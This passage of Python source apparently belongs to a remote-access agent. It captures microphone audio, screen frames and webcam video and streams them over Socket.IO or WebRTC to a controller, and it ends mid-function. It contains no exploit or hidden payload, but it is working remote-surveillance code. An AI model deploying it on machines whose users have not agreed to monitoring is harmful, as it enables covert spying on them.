# Note: TARGET_AUDIO_FPS, AUDIO_CAPTURE_QUEUE_SIZE and AUDIO_ENCODE_QUEUE_SIZE are defined globally

def audio_capture_worker(agent_id):
    """Capture audio frames from microphone and put in capture queue."""
    global AUDIO_STREAMING_ENABLED, audio_capture_queue
    
    if audio_capture_queue is None:
        log_message("Error: Audio capture queue not initialized", "error")
        return
    
    if not PYAUDIO_AVAILABLE or FORMAT is None:
        # Fallback to sounddevice if PyAudio is unavailable
        try:
            import sounddevice as sd
            import numpy as _np
        except Exception:
            log_message("Error: No audio capture library available (PyAudio/sounddevice)", "error")
            return
        stream = None
        try:
            stream = sd.InputStream(
                samplerate=RATE,
                channels=CHANNELS,
                dtype='int16',
                blocksize=CHUNK,
                callback=lambda indata, frames, time_info, status: (
                    (audio_capture_queue.put_nowait(indata.tobytes()))
                    if not audio_capture_queue.full()
                    else (
                        audio_capture_queue.get_nowait(),
                        audio_capture_queue.put_nowait(indata.tobytes())
                    )
                )
            )
            stream.start()
            log_message("Audio capture started (sounddevice fallback)")
            while AUDIO_STREAMING_ENABLED:
                time.sleep(0.02)
        except KeyboardInterrupt:
            log_message("Audio capture worker interrupted")
        except Exception as e:
            log_message(f"Audio capture initialization error (sounddevice): {e}")
        finally:
            try:
                if stream:
                    stream.stop()
                    stream.close()
            except Exception:
                pass
            log_message("Audio capture stopped (sounddevice)")
        return
    
    p = None
    stream = None
    try:
        p = pyaudio.PyAudio()
        
        # Find default input device
        input_device_index = None
        try:
            default_device_info = p.get_default_input_device_info()
            input_device_index = default_device_info['index']
            log_message(f"Using audio device: {default_device_info['name']}")
        except Exception as e:
            log_message(f"Could not get default audio device: {e}")
            p.terminate()
            return
        
        # Open audio stream
        stream = p.open(
            format=FORMAT,
            channels=CHANNELS,
            rate=RATE,
            input=True,
            frames_per_buffer=CHUNK,
            input_device_index=input_device_index
        )
        
        log_message("Audio capture started")
        
        while AUDIO_STREAMING_ENABLED:
            try:
                # Capture audio chunk
                data = stream.read(CHUNK, exception_on_overflow=False)
                
                # Put in queue, drop oldest if full
                try:
                    audio_capture_queue.put_nowait(data)
                except queue.Full:
                    try:
                        audio_capture_queue.get_nowait()  # Remove oldest
                        audio_capture_queue.put_nowait(data)  # Add new
                    except queue.Empty:
                        pass
                
                # Pace based on chunk size and sample rate (~20ms)
                frame_time = CHUNK / float(RATE)
                time.sleep(max(0.0, frame_time * 0.9))
            except KeyboardInterrupt:
                log_message("Audio capture worker interrupted")
                break
            except Exception as e:
                log_message(f"Audio capture error: {e}")
                break
        
    except KeyboardInterrupt:
        log_message("Audio capture worker interrupted")
    except Exception as e:
        log_message(f"Audio capture initialization error: {e}")
    finally:
        if stream:
            stream.stop_stream()
            stream.close()
        if p:
            p.terminate()
        log_message("Audio capture stopped")

def audio_encode_worker(agent_id):
    """Encode audio frames from capture queue to Opus and put in encode queue."""
    global AUDIO_STREAMING_ENABLED, audio_capture_queue, audio_encode_queue, MIC_VOLUME, NOISE_REDUCTION_ENABLED
    
    if audio_capture_queue is None or audio_encode_queue is None:
        log_message("Error: Audio queues not initialized", "error")
        return
    
    try:
        import opuslib
        # Create Opus encoder (48kHz, mono, 20ms frame size)
        encoder = opuslib.Encoder(48000, 1, opuslib.APPLICATION_AUDIO)
        encoder.bitrate = 64000  # 64 kbps for good quality
        log_message("Opus encoder initialized")
    except ImportError:
        log_message("Warning: opuslib not available, using PCM", "warning")
        encoder = None
    except Exception as e:
        log_message(f"Error initializing Opus encoder: {e}")
        encoder = None
    
    try:
        while AUDIO_STREAMING_ENABLED:
            try:
                # Get audio data from capture queue
                try:
                    pcm_data = audio_capture_queue.get(timeout=0.5)
                except queue.Empty:
                    continue
                try:
                    import numpy as _np
                    arr = _np.frombuffer(pcm_data, dtype=_np.int16)
                    if MIC_VOLUME != 1.0:
                        arr = _np.clip(arr.astype(_np.float32) * float(MIC_VOLUME), -32768, 32767).astype(_np.int16)
                    if NOISE_REDUCTION_ENABLED:
                        thr = 500
                        mask = _np.abs(arr) > thr
                        arr = (arr * mask).astype(_np.int16)
                    pcm_data = arr.tobytes()
                except Exception:
                    pass
                
                # Encode with Opus if enabled and available, otherwise use PCM
                if encoder and AUDIO_ENCODING_OPUS_ENABLED:
                    try:
                        # Convert PCM to Opus
                        if not NUMPY_AVAILABLE:
                            log_message("NumPy not available for audio processing", "warning")
                            encoded_data = pcm_data  # Fallback to PCM
                            continue
                        pcm_array = np.frombuffer(pcm_data, dtype=np.int16)
                        # Resample to 48k if needed for Opus 20ms frames
                        try:
                            sr = RATE if isinstance(RATE, int) else 44100
                        except Exception:
                            sr = 44100
                        if sr != 48000:
                            new_len = int(round(len(pcm_array) * 48000.0 / float(sr)))
                            x = np.arange(len(pcm_array), dtype=np.float32)
                            xp = np.linspace(0.0, float(len(pcm_array) - 1), new_len, dtype=np.float32)
                            pcm_array = np.clip(np.interp(xp, x, pcm_array.astype(np.float32)), -32768, 32767).astype(np.int16)
                            sr = 48000
                        frame_size = 960  # 20ms at 48kHz
                        if len(pcm_array) != frame_size:
                            if len(pcm_array) > frame_size:
                                pcm_array = pcm_array[:frame_size]
                            else:
                                pad = np.zeros(frame_size - len(pcm_array), dtype=np.int16)
                                pcm_array = np.concatenate([pcm_array, pad])
                        encoded_data = encoder.encode(pcm_array.tobytes(), frame_size)
                    except Exception as e:
                        log_message(f"Opus encoding error: {e}")
                        encoded_data = pcm_data  # Fallback to PCM
                else:
                    encoded_data = pcm_data  # Use PCM
                
                # Put in encode queue, drop oldest if full
                try:
                    audio_encode_queue.put_nowait(encoded_data)
                except queue.Full:
                    try:
                        audio_encode_queue.get_nowait()  # Remove oldest
                        audio_encode_queue.put_nowait(encoded_data)  # Add new
                    except queue.Empty:
                        pass
                        
            except KeyboardInterrupt:
                log_message("Audio encode worker interrupted")
                break
            except Exception as e:
                log_message(f"Audio encoding error: {e}")
                time.sleep(0.1)
    except KeyboardInterrupt:
        log_message("Audio encode worker interrupted")
    
    log_message("Audio encoding stopped")

def audio_send_worker(agent_id):
    """Send encoded audio frames from encode queue via socket.io."""
    global AUDIO_STREAMING_ENABLED, audio_encode_queue
    
    if sio is None:
        log_message("Error: socket.io not available for audio sending", "error")
        return
    
    if audio_encode_queue is None:
        log_message("Error: Audio encode queue not initialized", "error")
        return
    
    # Track last log time to avoid spam
    last_disconnect_log_time = 0.0
    
    try:
        while AUDIO_STREAMING_ENABLED:
            try:
                # Get encoded data from encode queue
                try:
                    encoded_data = audio_encode_queue.get(timeout=0.5)
                except queue.Empty:
                    continue
                
                # Check if socket is connected before sending
                if not sio.connected:
                    # Throttle disconnect log messages
                    now = time.time()
                    if now >= last_disconnect_log_time + 5.0:
                        log_message("Socket.IO disconnected, deferring audio frames", "warning")
                        last_disconnect_log_time = now
                    time.sleep(0.5)
                    continue
                
                # Send via socket.io (binary data is automatically detected)
                try:
                    safe_emit('audio_frame', {
                        'agent_id': agent_id,
                        'frame': encoded_data
                    })
                except Exception as e:
                    error_msg = str(e)
                    # Silence "not a connected namespace" errors
                    if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
                        log_message(f"Audio send error: {e}")
                    time.sleep(0.1)
                    
            except KeyboardInterrupt:
                log_message("Audio send worker interrupted")
                break
            except Exception as e:
                log_message(f"Audio sending error: {e}")
                time.sleep(0.1)
    except KeyboardInterrupt:
        log_message("Audio send worker interrupted")
    
    log_message("Audio sending stopped")

# stream_screen_h264_socketio() is defined later after worker functions (line ~11851)

def _run_screen_stream(agent_id):
    """Thread target for screen streaming - uses optimized multi-threaded pipeline.
    
    Uses globals() lookup at runtime to find functions defined later in the file.
    """
    # Look up functions at runtime (after module has loaded)
    # This MUST use globals() because the functions are defined later in the file
    import sys
    current_module = sys.modules[__name__]
    
    # Try to get the chooser function (defined at line ~12426)
    chooser = getattr(current_module, 'stream_screen_webrtc_or_socketio', None)
    if callable(chooser):
        log_message("[STREAM] Using optimized WebRTC/Socket.IO chooser")
        return chooser(agent_id)
    
    # Fallback to h264 socket.io (defined at line ~12406)
    h264_socket = getattr(current_module, 'stream_screen_h264_socketio', None)
    if callable(h264_socket):
        log_message("[STREAM] Using optimized H.264 Socket.IO pipeline")
        return h264_socket(agent_id)
    
    # Final fallback to simple stream
    log_message("[STREAM] Using simple Socket.IO stream (compat mode)")
    return stream_screen_simple_socketio(agent_id)

def stream_screen_simple_socketio(agent_id):
    """Compatibility fallback: single-threaded JPEG-over-Socket.IO screen stream.
    Used when modern streaming functions are not yet defined during startup.
    """
    global STREAMING_ENABLED
    if not MSS_AVAILABLE or not NUMPY_AVAILABLE or not CV2_AVAILABLE:
        log_message("Required modules not available for simple screen capture", "error")
        return False
    if not SOCKETIO_AVAILABLE or sio is None:
        log_message("Socket.IO not available for simple screen streaming", "error")
        return False
    try:
        import mss
        with mss.mss() as sct:
            monitors = sct.monitors
            monitor_index = 1 if len(monitors) > 1 else 0
            monitor = monitors[monitor_index]
            # Derive initial dimensions and apply downscale cap similar to worker path
            width = int(monitor.get('width', 0) or (monitor['right'] - monitor['left'])) if isinstance(monitor, dict) else (
                monitor[2] - monitor[0]
            )
            height = int(monitor.get('height', 0) or (monitor['bottom'] - monitor['top'])) if isinstance(monitor, dict) else (
                monitor[3] - monitor[1]
            )
            if width > SCREEN_MAX_WIDTH:
                scale = SCREEN_MAX_WIDTH / width
                width = int(width * scale)
                height = int(height * scale)
            frame_time = 1.0 / max(1, int(TARGET_FPS) if 'TARGET_FPS' in globals() else 15)
            log_message("Started simple Socket.IO screen stream (compat mode).")
            next_not_connected_log_time = 0.0
            
            try:
                while STREAMING_ENABLED:
                    try:
                        start_ts = time.time()
                        sct_img = sct.grab(monitor if isinstance(monitor, dict) else monitors[monitor_index])
                        img = np.array(sct_img)
                        if img.shape[1] != width or img.shape[0] != height:
                            img = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
                        if img.shape[2] == 4:
                            img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                        ok, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, int(SCREEN_JPEG_QUALITY)])
                        if ok:
                            connected = SOCKETIO_AVAILABLE and sio is not None and getattr(sio, 'connected', False)
                            if not connected:
                                # Throttle log to avoid spam until socket connects
                                now = time.time()
                                if now >= next_not_connected_log_time:
                                    log_message("Socket.IO not connected; deferring screen frames")
                                    next_not_connected_log_time = now + 5.0
                            else:
                                try:
                                    b64 = base64.b64encode(encoded.tobytes()).decode('utf-8')
                                    safe_emit('screen_frame', {'agent_id': agent_id, 'frame': f'data:image/jpeg;base64,{b64}'})
                                except Exception as send_err:
                                    # Silence namespace/connection race errors and retry on next loop
                                    msg = str(send_err)
                                    if "not a connected namespace" in msg or "Connection is closed" in msg:
                                        pass
                                    else:
                                        log_message(f"Simple stream send error: {send_err}")
                        # FPS pacing
                        elapsed = time.time() - start_ts
                        sleep_for = frame_time - elapsed
                        if sleep_for > 0:
                            time.sleep(sleep_for)
                    except KeyboardInterrupt:
                        log_message("Screen stream interrupted")
                        break
            except KeyboardInterrupt:
                log_message("Screen stream interrupted")
            
            return True
    except KeyboardInterrupt:
        log_message("Screen stream interrupted")
        return False
    except Exception as e:
        log_message(f"Simple screen streaming error: {e}", "error")
        return False

def start_streaming(agent_id):
    global STREAMING_ENABLED, STREAM_THREAD
    
    try:
        with _stream_lock:  # [ OK ] THREAD-SAFE: Prevent race condition
            if not (SOCKETIO_AVAILABLE and sio is not None and getattr(sio, 'connected', False)):
                log_message("Cannot start screen streaming: Socket.IO is not connected", "warning")
                emit_system_notification('warning', 'Screen Stream', 'Cannot start: not connected to controller')
                return
            if STREAMING_ENABLED:
                log_message("Screen streaming already running", "warning")
                emit_system_notification('warning', 'Screen Stream', 'Screen streaming is already active')
                return
            
            STREAMING_ENABLED = True
            try:
                INPUT_CAPTURE_ENABLED = True
            except Exception:
                pass
            # Use a safe wrapper that defers until functions are defined
            STREAM_THREAD = threading.Thread(target=_run_screen_stream, args=(agent_id,))
            STREAM_THREAD.daemon = True
            STREAM_THREAD.start()
            log_message("Started smart video streaming (WebRTC preferred, Socket.IO fallback).")
            emit_system_notification('success', 'Screen Stream Started', 'Screen streaming started successfully')
            
            if AUTO_START_AUDIO_WITH_SCREEN:
                log_message("[AUDIO] Auto-starting audio streaming with screen stream...")
                start_audio_streaming(agent_id)
            
    except Exception as e:
        log_message(f"Failed to start screen streaming: {e}", "error")
        emit_system_notification('error', 'Screen Stream Failed', f'Failed to start screen streaming: {str(e)}')
        STREAMING_ENABLED = False

def stop_streaming():
    global STREAMING_ENABLED, STREAM_THREAD, STREAM_THREADS, capture_queue, encode_queue
    
    try:
        with _stream_lock:  # [ OK ] THREAD-SAFE
            if not STREAMING_ENABLED:
                emit_system_notification('info', 'Screen Stream', 'Screen streaming is not active')
                return
            
            STREAMING_ENABLED = False
            try:
                INPUT_CAPTURE_ENABLED = False
            except Exception:
                pass
            
            # Clear queues to wake up any waiting threads (non-blocking)
            try:
                if capture_queue:
                    while not capture_queue.empty():
                        try:
                            capture_queue.get_nowait()
                        except:
                            break
            except:
                pass
            
            try:
                if encode_queue:
                    while not encode_queue.empty():
                        try:
                            encode_queue.get_nowait()
                        except:
                            break
            except:
                pass
            
            # Don't join threads - they're daemon threads and will exit naturally
            # This prevents blocking the main thread and causing disconnects
            STREAM_THREAD = None
            STREAM_THREADS = []
            capture_queue = None
            encode_queue = None
            log_message("Stopped video stream.")
            emit_system_notification('success', 'Screen Stream Stopped', 'Screen streaming stopped successfully')
            
            if AUTO_START_AUDIO_WITH_SCREEN:
                log_message("[AUDIO] Auto-stopping audio streaming with screen stream...")
                stop_audio_streaming()
            
    except Exception as e:
        log_message(f"Error stopping screen streaming: {e}", "error")
        emit_system_notification('error', 'Screen Stream Error', f'Error stopping screen streaming: {str(e)}')
        STREAMING_ENABLED = False

def start_audio_streaming(agent_id):
    """Start smart audio streaming that automatically chooses WebRTC or Socket.IO."""
    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREADS, audio_capture_queue, audio_encode_queue
    import queue
    import threading
    
    try:
        with _audio_stream_lock:  # [ OK ] THREAD-SAFE: Prevent race condition
            if not (SOCKETIO_AVAILABLE and sio is not None and getattr(sio, 'connected', False)):
                log_message("Cannot start audio streaming: Socket.IO is not connected", "warning")
                emit_system_notification('warning', 'Audio Stream', 'Cannot start: not connected to controller')
                return
            if AUDIO_STREAMING_ENABLED:
                log_message("Audio streaming already running", "warning")
                emit_system_notification('warning', 'Audio Stream', 'Audio streaming is already active')
                return
            
            AUDIO_STREAMING_ENABLED = True
            try:
                init_audio_params()
            except Exception:
                pass
            
            # Try WebRTC first for low latency
            if AIORTC_AVAILABLE and WEBRTC_ENABLED:
                try:
                    # Use WebRTC audio streaming
                    loop = ensure_webrtc_loop(agent_id)
                    asyncio.run_coroutine_threadsafe(start_webrtc_audio_streaming(agent_id), loop)
                    log_message("Started WebRTC audio streaming (sub-second latency)")
                    emit_system_notification('success', 'Audio Stream Started', 'WebRTC audio streaming started successfully')
                    return
                except Exception as e:
                    log_message(f"WebRTC audio streaming failed, falling back to Socket.IO: {e}", "warning")
                    emit_system_notification('warning', 'Audio Stream Fallback', f'WebRTC failed, using Socket.IO fallback: {str(e)}')
            
            # Fallback to Socket.IO multi-threaded pipeline
            audio_capture_queue = queue.Queue(maxsize=AUDIO_CAPTURE_QUEUE_SIZE)
            audio_encode_queue = queue.Queue(maxsize=AUDIO_ENCODE_QUEUE_SIZE)
            
            # Start worker threads
            threads = [
                threading.Thread(target=audio_capture_worker, args=(agent_id,), daemon=True),
                threading.Thread(target=audio_encode_worker, args=(agent_id,), daemon=True),
                threading.Thread(target=audio_send_worker, args=(agent_id,), daemon=True)
            ]
            
            for thread in threads:
                thread.start()
            
            AUDIO_STREAM_THREADS = threads
            log_message("Started Socket.IO Opus audio streaming pipeline (fallback mode).")
            emit_system_notification('success', 'Audio Stream Started', 'Socket.IO audio streaming started successfully')
            try:
                if AUDIO_TEST_TONE_ON_START and audio_encode_queue is not None:
                    sr = RATE if isinstance(RATE, int) else 44100
                    dur = 1.0
                    hz = 440.0
                    n = int(sr * dur)
                    try:
                        import numpy as _np
                        t = _np.arange(n) / float(sr)
                        wave = (0.3 * _np.sin(2.0 * _np.pi * hz * t)).astype(_np.float32)
                        pcm = (wave * 32767.0).astype(_np.int16).tobytes()
                    except Exception:
                        import math
                        pcm = bytearray()
                        for i in range(n):
                            v = int(0.3 * 32767.0 * math.sin(2.0 * math.pi * hz * (i / float(sr))))
                            pcm += (v & 0xFFFF).to_bytes(2, byteorder='little', signed=True)
                        pcm = bytes(pcm)
                    # Inject a few chunks to ensure audible beep
                    for _ in range(5):
                        try:
                            audio_encode_queue.put_nowait(pcm)
                        except Exception:
                            break
                    log_message("[AUDIO] Injected test tone to verify playback")
            except Exception:
                pass
            
    except Exception as e:
        log_message(f"Failed to start audio streaming: {e}", "error")
        emit_system_notification('error', 'Audio Stream Failed', f'Failed to start audio streaming: {str(e)}')
        AUDIO_STREAMING_ENABLED = False

def stop_audio_streaming():
    """Stop modern Opus audio streaming pipeline."""
    global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREADS, audio_capture_queue, audio_encode_queue
    
    try:
        with _audio_stream_lock:  # [ OK ] THREAD-SAFE
            if not AUDIO_STREAMING_ENABLED:
                emit_system_notification('info', 'Audio Stream', 'Audio streaming is not active')
                return
            
            AUDIO_STREAMING_ENABLED = False
            
            # Clear queues to wake up any waiting threads (non-blocking)
            try:
                if audio_capture_queue:
                    while not audio_capture_queue.empty():
                        try:
                            audio_capture_queue.get_nowait()
                        except:
                            break
            except:
                pass
            
            try:
                if audio_encode_queue:
                    while not audio_encode_queue.empty():
                        try:
                            audio_encode_queue.get_nowait()
                        except:
                            break
            except:
                pass
            
            # Don't join threads - they're daemon threads and will exit naturally
            # This prevents blocking the main thread and causing disconnects
            AUDIO_STREAM_THREADS = []
            audio_capture_queue = None
            audio_encode_queue = None
            log_message("Stopped Opus audio streaming pipeline.")
            emit_system_notification('success', 'Audio Stream Stopped', 'Audio streaming stopped successfully')
            
    except Exception as e:
        log_message(f"Error stopping audio streaming: {e}", "error")
        emit_system_notification('error', 'Audio Stream Error', f'Error stopping audio streaming: {str(e)}')
        AUDIO_STREAMING_ENABLED = False

def start_camera_streaming(agent_id):
    """Start smart camera streaming that automatically chooses WebRTC or Socket.IO."""
    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREADS, CAMERA_STREAM_START_TIME
    
    try:
        with _camera_stream_lock:  # [ OK ] THREAD-SAFE: Prevent race condition
            if not (SOCKETIO_AVAILABLE and sio is not None and getattr(sio, 'connected', False)):
                log_message("Cannot start camera streaming: Socket.IO is not connected", "warning")
                emit_system_notification('warning', 'Camera Stream', 'Cannot start: not connected to controller')
                return
            if CAMERA_STREAMING_ENABLED:
                log_message("Camera streaming already running", "warning")
                emit_system_notification('warning', 'Camera Stream', 'Camera streaming is already active')
                return
            
            CAMERA_STREAMING_ENABLED = True
            CAMERA_STREAM_START_TIME = time.time()
            try:
                INPUT_CAPTURE_ENABLED = True
            except Exception:
                pass
            
            # Try WebRTC first for low latency
            if AIORTC_AVAILABLE and WEBRTC_ENABLED:
                try:
                    # Use WebRTC camera streaming
                    asyncio.create_task(start_webrtc_camera_streaming(agent_id))
                    log_message("Started WebRTC camera streaming (sub-second latency)")
                    emit_system_notification('success', 'Camera Stream Started', 'WebRTC camera streaming started successfully with sub-second latency')
                    
                    if AUTO_START_AUDIO_WITH_CAMERA:
                        log_message("[AUDIO] Auto-starting audio streaming with camera stream...")
                        start_audio_streaming(agent_id)
                    return
                except Exception as e:
                    log_message(f"WebRTC camera streaming failed, falling back to Socket.IO: {e}", "warning")
                    emit_system_notification('warning', 'Camera Stream Fallback', f'WebRTC failed, using Socket.IO fallback: {str(e)}')
            
            # Fallback to Socket.IO
            stream_camera_h264_socketio(agent_id)
            log_message("Started Socket.IO camera stream (fallback mode).")
            emit_system_notification('success', 'Camera Stream Started', 'Socket.IO camera streaming started successfully')
            
            if AUTO_START_AUDIO_WITH_CAMERA:
                log_message("[AUDIO] Auto-starting audio streaming with camera stream...")
                start_audio_streaming(agent_id)
            
    except Exception as e:
        log_message(f"Failed to start camera streaming: {e}", "error")
        emit_system_notification('error', 'Camera Stream Failed', f'Failed to start camera streaming: {str(e)}')
        CAMERA_STREAMING_ENABLED = False

def stop_camera_streaming():
    """Stop modern H.264 camera streaming pipeline."""
    global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREADS, camera_capture_queue, camera_encode_queue, CAMERA_STREAM_START_TIME
    
    try:
        with _camera_stream_lock:  # [ OK ] THREAD-SAFE
            if not CAMERA_STREAMING_ENABLED:
                emit_system_notification('info', 'Camera Stream', 'Camera streaming is not active')
                return
            
            # Prevent race condition: Don't stop if started less than 2 seconds ago
            # This handles cases where UI sends start/stop in quick succession or async logic conflicts
            try:
                if 'CAMERA_STREAM_START_TIME' in globals() and CAMERA_STREAM_START_TIME and time.time() - CAMERA_STREAM_START_TIME < 2.0:
                    log_message("Warning: Camera stop requested immediately after start - ignoring to prevent race condition", "warning")
                    return
            except Exception:
                pass

            CAMERA_STREAMING_ENABLED = False
            try:
                INPUT_CAPTURE_ENABLED = False
            except Exception:
                pass
            
            # Clear queues to wake up any waiting threads (non-blocking)
            try:
                if camera_capture_queue:
                    while not camera_capture_queue.empty():
                        try:
                            camera_capture_queue.get_nowait()
                        except:
                            break
            except:
                pass
            
            try:
                if camera_encode_queue:
                    while not camera_encode_queue.empty():
                        try:
                            camera_encode_queue.get_nowait()
                        except:
                            break
            except:
                pass
            
            # Don't join threads - they're daemon threads and will exit naturally
            # This prevents blocking the main thread and causing disconnects
            CAMERA_STREAM_THREADS = []
            camera_capture_queue = None
            camera_encode_queue = None
            log_message("Stopped camera stream.")
            emit_system_notification('success', 'Camera Stream Stopped', 'Camera streaming stopped successfully')
            
            if AUTO_START_AUDIO_WITH_CAMERA:
                log_message("[AUDIO] Auto-stopping audio streaming with camera stream...")
                stop_audio_streaming()
            
    except Exception as e:
        log_message(f"Error stopping camera streaming: {e}", "error")
        emit_system_notification('error', 'Camera Stream Error', f'Error stopping camera streaming: {str(e)}')
        CAMERA_STREAMING_ENABLED = False

# ========================================================================================
# WEBRTC PEER CONNECTION MANAGEMENT FOR LOW-LATENCY STREAMING
# ========================================================================================

async def create_webrtc_peer_connection(agent_id, enable_screen=True, enable_audio=True, enable_camera=False):
    """Create and configure WebRTC peer connection with media tracks."""
    if not AIORTC_AVAILABLE:
        log_message("WebRTC not available, falling back to Socket.IO streaming", "warning")
        return None
    
    try:
        ice_list = WEBRTC_CONFIG.get('ice_servers', WEBRTC_ICE_SERVERS)
        ice_servers = []
        for s in ice_list:
            try:
                urls = s.get('urls')
                ice_servers.append(RTCIceServer(urls=urls))
            except Exception:
                pass
        pc = RTCPeerConnection(configuration=RTCConfiguration(iceServers=ice_servers))
        
        # Add media tracks
        if enable_screen:
            screen_track = ScreenTrack(
                agent_id,
                target_fps=WEBRTC_CONFIG['quality_levels']['low']['fps'],
                quality=WEBRTC_CONFIG['quality_levels']['low']['quality']
            )
            pc.addTrack(screen_track)
            WEBRTC_STREAMS[f"{agent_id}_screen"] = screen_track
            log_message(f"Added screen track to WebRTC connection for agent {agent_id}")
        
        if enable_audio:
            audio_track = AudioTrack(agent_id, sample_rate=44100, channels=1)
            pc.addTrack(audio_track)
            WEBRTC_STREAMS[f"{agent_id}_audio"] = audio_track
            log_message(f"Added audio track to WebRTC connection for agent {agent_id}")
        
        if enable_camera:
            camera_track = CameraTrack(
                agent_id,
                camera_index=0,
                target_fps=WEBRTC_CONFIG['quality_levels']['low']['fps'],
                quality=WEBRTC_CONFIG['quality_levels']['low']['quality']
            )
            pc.addTrack(camera_track)
            WEBRTC_STREAMS[f"{agent_id}_camera"] = camera_track
            log_message(f"Added camera track to WebRTC connection for agent {agent_id}")
        
        # Store peer connection
        WEBRTC_PEER_CONNECTIONS[agent_id] = pc
        
        # Set up connection state change handlers
        @pc.on("connectionstatechange")
        async def on_connectionstatechange():
            log_message(f"WebRTC connection state changed to {pc.connectionState} for agent {agent_id}")
            if pc.connectionState == "failed":
                await close_webrtc_connection(agent_id)
        
        @pc.on("iceconnectionstatechange")
        async def on_iceconnectionstatechange():
            log_message(f"ICE connection state: {pc.iceConnectionState} for agent {agent_id}")
        
        @pc.on("icegatheringstatechange")
        async def on_icegatheringstatechange():
            log_message(f"ICE gathering state: {pc.iceGatheringState} for agent {agent_id}")
        
        @pc.on("icecandidate")
        def on_icecandidate(candidate):
            try:
                if not candidate:
                    return
                safe_emit('webrtc_ice_candidate', {
                    'agent_id': agent_id,
                    'candidate': {
                        'candidate': candidate.candidate,
                        'sdpMid': candidate.sdpMid,
                        'sdpMLineIndex': candidate.sdpMLineIndex
                    }
                })
            except Exception as e:
                log_message(f"Error sending ICE candidate: {e}", "error")
        
        log_message(f"WebRTC peer connection created successfully for agent {agent_id}")
        return pc
        
    except Exception as e:
        log_message(f"Failed to create WebRTC peer connection: {e}", "error")
        return None


async def create_webrtc_offer(agent_id):
    """Create WebRTC offer for the specified agent."""
    pc = WEBRTC_PEER_CONNECTIONS.get(agent_id)
    if not pc:
        log_message(f"No WebRTC peer connection found for agent {agent_id}", "error")
        return None
    
    try:
        # Create offer with optimized settings for low latency
        offer = await pc.createOffer()
        
        # Set codec preferences for low latency
        if hasattr(offer, 'sdp'):
            # Prefer VP8/VP9 for lower latency, H.264 as fallback
            sdp = offer.sdp
            # Add codec preferences
            sdp = sdp.replace("useinbandfec=1", "useinbandfec=1; stereo=1; maxaveragebitrate=128000")
            
            # Set low latency options
            sdp = sdp.replace("a=mid:0", "a=mid:0\na=content:main")
            sdp = sdp.replace("a=mid:1", "a=mid:1\na=content:main")
            
            # Update offer with modified SDP
            offer.sdp = sdp
        
        await pc.setLocalDescription(offer)
        log_message(f"WebRTC offer created for agent {agent_id}")
        return offer
        
    except Exception as e:
        log_message(f"Failed to create WebRTC offer: {e}", "error")
        return None


async def handle_webrtc_answer(agent_id, answer_sdp):
    """Handle WebRTC answer from controller."""
    pc = WEBRTC_PEER_CONNECTIONS.get(agent_id)
    if not pc:
        log_message(f"No WebRTC peer connection found for agent {agent_id}", "error")
        return False
    
    try:
        # Create RTCSessionDescription from SDP
        answer = RTCSessionDescription(sdp=answer_sdp, type="answer")
        
        # Set remote description
        await pc.setRemoteDescription(answer)
        log_message(f"WebRTC answer set for agent {agent_id}")
        return True
        
    except Exception as e:
        log_message(f"Failed to handle WebRTC answer: {e}", "error")
        return False


async def handle_webrtc_ice_candidate(agent_id, candidate_data):
    """Handle ICE candidate from controller."""
    pc = WEBRTC_PEER_CONNECTIONS.get(agent_id)
    if not pc:
        log_message(f"No WebRTC peer connection found for agent {agent_id}", "error")
        return False
    
    try:
        c_str = candidate_data.get('candidate')
        sdp_mid = candidate_data.get('sdpMid')
        sdp_mline_index = candidate_data.get('sdpMLineIndex')
        candidate = RTCIceCandidate(sdpMid=sdp_mid, sdpMLineIndex=sdp_mline_index, candidate=c_str)
        await pc.addIceCandidate(candidate)
        log_message(f"ICE candidate added for agent {agent_id}")
        return True
        
    except Exception as e:
        log_message(f"Failed to add ICE candidate: {e}", "error")
        return False


async def close_webrtc_connection(agent_id):
    """Close WebRTC connection for the specified agent."""
    pc = WEBRTC_PEER_CONNECTIONS.get(agent_id)
    if pc:
        try:
            await pc.close()
            del WEBRTC_PEER_CONNECTIONS[agent_id]
            
            # Clean up media tracks
            for key in list(WEBRTC_STREAMS.keys()):
                if key.startswith(f"{agent_id}_"):
                    del WEBRTC_STREAMS[key]
            
            log_message(f"WebRTC connection closed for agent {agent_id}")
            return True
            
        except Exception as e:
            log_message(f"Error closing WebRTC connection: {e}", "error")
            return False
    
    return True


def start_webrtc_streaming(agent_id, enable_screen=True, enable_audio=True, enable_camera=False):
    """Start WebRTC streaming for the specified agent."""
    if not AIORTC_AVAILABLE:
        log_message("WebRTC not available, using fallback Socket.IO streaming", "warning")
        # Fallback to existing Socket.IO streaming
        if enable_screen:
            start_streaming(agent_id)
        if enable_audio:
            start_audio_streaming(agent_id)
        if enable_camera:
            start_camera_streaming(agent_id)
        return False
    
    try:
        if not (SOCKETIO_AVAILABLE and sio is not None and getattr(sio, 'connected', False)):
            log_message("Cannot start WebRTC streaming: Socket.IO is not connected", "warning")
            return False
        loop = ensure_webrtc_loop(agent_id)
        async def setup_webrtc():
            pc = await create_webrtc_peer_connection(agent_id, enable_screen, enable_audio, enable_camera)
            if not pc:
                return False
            offer = await create_webrtc_offer(agent_id)
            if not offer:
                return False
            if SOCKETIO_AVAILABLE:
                safe_emit('webrtc_offer', {
                    'agent_id': agent_id,
                    'offer_sdp': offer.sdp,
                    'enable_screen': enable_screen,
                    'enable_audio': enable_audio,
                    'enable_camera': enable_camera
                })
                log_message(f"WebRTC offer sent to controller for agent {agent_id}")
            return True
        result = run_webrtc_coro(agent_id, setup_webrtc())
        
        if result:
            WEBRTC_ENABLED = True
            log_message(f"WebRTC streaming started for agent {agent_id}")
            return True
        else:
            log_message(f"Failed to start WebRTC streaming for agent {agent_id}", "error")
            return False
            
    except Exception as e:
        log_message(f"Error starting WebRTC streaming: {e}", "error")
        return False


def stop_webrtc_streaming(agent_id):
    """Stop WebRTC streaming for the specified agent."""
    if not AIORTC_AVAILABLE:
        log_message("WebRTC not available", "warning")
        return False
    
    try:
        result = run_webrtc_coro(agent_id, close_webrtc_connection(agent_id))
        
        if result:
            WEBRTC_ENABLED = False
            try:
                INPUT_CAPTURE_ENABLED = False
            except Exception:
                pass
            log_message(f"WebRTC streaming stopped for agent {agent_id}")
            shutdown_webrtc_loop(agent_id)
